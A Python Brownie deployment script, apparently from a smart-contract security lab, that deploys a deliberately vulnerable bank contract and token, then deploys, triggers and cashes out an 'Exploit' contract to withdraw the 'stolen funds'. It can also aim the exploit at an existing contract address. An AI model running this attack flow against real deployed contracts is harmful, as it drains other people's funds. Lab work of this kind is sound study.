from scripts.helpful_scripts import get_account
from brownie import Exploit, UnibaBankVuln, UnibaToken, Contract
from brownie.network import gas_price
from brownie.network.gas.strategies import LinearScalingStrategy

gas_strategy = LinearScalingStrategy("60 gwei", "70 gwei", 1.1)
gas_price(gas_strategy)

def deploy_token(verify):
    account = get_account()

    token = UnibaToken.deploy(
        {"from": account,
        "gas_price": gas_strategy},
        publish_source=verify
    )
    print(f"UnibaToken contract deployed to {token.address}")
    return token.address

def deploy_dapp(token, verify):
    account = get_account()

    dapp = UnibaBankVuln.deploy(
        token,
        {"from": account,
        "gas_price": gas_strategy},
        publish_source=verify
    )
    print(f"Dapp contract deployed to {dapp.address}")
    return dapp.address

def deployExploit(dappContract):
    token = Exploit.deploy(
        dappContract,
        {"from": get_account(),
        "gas_price": gas_strategy}
    )
    print(f"Exploit contract deployed to {token.address}")
    return token.address

def initExploit(exploitContract, amount):
    contract = Contract.from_abi(Exploit._name, exploitContract, Exploit.abi)
    contract.init({"from":get_account(),"value":amount})
    print(f"Exploit initialized!")

def exploit(exploitContract, amount):
    print(f"Exploiting vulnerable contract...")
    contract = Contract.from_abi(Exploit._name, exploitContract, Exploit.abi)
    contract.exploit({"from":get_account(),"value":amount})
    print(f"Exploited!")

def withdrawFundsStolen(exploitContract):
    print(f"Withdrawing stolen funds...")
    contract = Contract.from_abi(Exploit._name, exploitContract, Exploit.abi)
    contract.payday({"from":get_account()})
    print(f"Withdrawn!")

def main(amount, verify=False, dappContract=None):
    if (dappContract is None):
        token = deploy_token(verify)
        dapp = deploy_dapp(token, verify)
    else:
        dapp = dappContract
    exploit = deployExploit(dapp)
    initExploit(exploit, amount)

def launchExploit(exploitContract, amount):
    exploit(exploitContract, amount)
    withdrawFundsStolen(exploitContract)